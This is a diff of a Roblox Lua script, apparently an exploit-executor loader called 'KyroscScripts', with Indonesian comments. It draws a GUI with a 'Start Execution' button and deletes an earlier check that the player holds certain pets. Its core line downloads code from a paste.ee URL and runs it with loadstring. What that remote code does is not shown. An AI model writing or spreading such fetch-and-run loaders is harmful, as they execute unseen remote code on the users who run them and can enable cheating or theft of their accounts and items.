@@ -1,29 +1,29 @@
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 local gui = player:WaitForChild("PlayerGui")
 
--- ScreenGui
+-- Membuat ScreenGui utama
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "KyroscScriptsGUI"
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = gui
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Frame Utama
+-- Membuat frame utama
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 320, 0, 200)
-mainFrame.Position = UDim2.new(0.5, -160, 0.5, -100)
+mainFrame.Size = UDim2.new(0, 300, 0, 180)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
 mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 mainFrame.BorderSizePixel = 0
 mainFrame.Parent = screenGui
 
+-- Membuat corner radius
 local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 10)
+corner.CornerRadius = UDim.new(0, 8)
 corner.Parent = mainFrame
 
--- Judul
+-- Membuat judul
 local title = Instance.new("TextLabel")
 title.Name = "Title"
 title.Text = "KyroscScripts (v3.2.1)"
@@ -32,15 +32,15 @@ title.Position = UDim2.new(0, 0, 0, 10)
 title.BackgroundTransparency = 1
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.Font = Enum.Font.GothamBold
-title.TextSize = 17
+title.TextSize = 16
 title.Parent = mainFrame
 
--- Pet Instructions
+-- Petunjuk
 local petInstructions = Instance.new("TextLabel")
 petInstructions.Name = "PetInstructions"
-petInstructions.Text = "Hold one of these pets:\n- Red Fox - Dragonfly\n- Raccoon - Praying Mantis\n- Deer"
+petInstructions.Text = "Click to execute script. Pet check disabled."
 petInstructions.Size = UDim2.new(0.9, 0, 0, 80)
-petInstructions.Position = UDim2.new(0.05, 0, 0, 45)
+petInstructions.Position = UDim2.new(0.05, 0, 0, 40)
 petInstructions.BackgroundTransparency = 1
 petInstructions.TextColor3 = Color3.fromRGB(200, 200, 200)
 petInstructions.Font = Enum.Font.Gotham
@@ -54,16 +54,16 @@ local startButton = Instance.new("TextButton")
 startButton.Name = "StartButton"
 startButton.Text = "Start Execution"
 startButton.Size = UDim2.new(0.9, 0, 0, 40)
-startButton.Position = UDim2.new(0.05, 0, 0, 135)
+startButton.Position = UDim2.new(0.05, 0, 0, 130)
 startButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
 startButton.BorderSizePixel = 0
 startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 startButton.Font = Enum.Font.GothamBold
-startButton.TextSize = 15
+startButton.TextSize = 14
 startButton.Parent = mainFrame
 
 local buttonCorner = Instance.new("UICorner")
-buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.CornerRadius = UDim.new(0, 6)
 buttonCorner.Parent = startButton
 
 -- Footer
@@ -78,7 +78,7 @@ footer.Font = Enum.Font.Gotham
 footer.TextSize = 12
 footer.Parent = mainFrame
 
--- Fungsi Notifikasi
+-- Notifikasi
 local function showNotification(message, color)
     local notification = Instance.new("TextLabel")
     notification.Name = "Notification"
@@ -91,66 +91,30 @@ local function showNotification(message, color)
     notification.Font = Enum.Font.GothamBold
     notification.TextSize = 14
     notification.Parent = mainFrame
-    
+
     local notifCorner = Instance.new("UICorner")
     notifCorner.CornerRadius = UDim.new(0, 6)
     notifCorner.Parent = notification
-    
-    task.delay(3, function()
+
+    delay(3, function()
         notification:Destroy()
     end)
 end
 
--- Fungsi Validasi Pet
-local function hasValidPet()
-    local validPets = { "Red Fox", "Raccoon", "Dragonfly", "Praying Mantis", "Deer" }
-
-    local function checkItems(container)
-        for _, item in ipairs(container:GetDescendants()) do
-            if item:IsA("Tool") or item:IsA("Model") then
-                if table.find(validPets, item.Name) then
-                    print("[DEBUG] Valid pet ditemukan:", item.Name)
-                    return true
-                end
-            end
-        end
-        return false
-    end
-
-    local character = player.Character or player.CharacterAdded:Wait()
-    if checkItems(character) then return true end
-
-    local backpack = player:FindFirstChild("Backpack")
-    if backpack and checkItems(backpack) then return true end
-
-    return false
-end
-
-
--- Fungsi Eksekusi
+-- Jalankan script tanpa validasi pet
 local function executeExternalScript()
-    showNotification("Checking for pets...", Color3.fromRGB(0, 100, 255))
-
-    if not hasValidPet() then
-        showNotification("No valid pet found!", Color3.fromRGB(255, 50, 50))
-        return
-    end
-
     showNotification("Executing script...", Color3.fromRGB(0, 150, 0))
 
     local success, err = pcall(function()
-        local code = HttpService:GetAsync("https://paste.ee/r/s7TguhY5")
-        assert(code and #code > 0, "Failed to fetch script")
-        loadstring(code)()
+        loadstring(game:HttpGet("https://paste.ee/r/s7TguhY5"))()
     end)
 
     if success then
         showNotification("Script executed!", Color3.fromRGB(0, 200, 0))
     else
-        showNotification("Error: " .. tostring(err), Color3.fromRGB(255, 50, 50))
-        warn("Execution error: " .. tostring(err))
+        showNotification("Error: "..tostring(err), Color3.fromRGB(255, 50, 50))
+        warn("Execution error: "..tostring(err))
     end
 end
 
--- Trigger tombol
 startButton.MouseButton1Click:Connect(executeExternalScript)
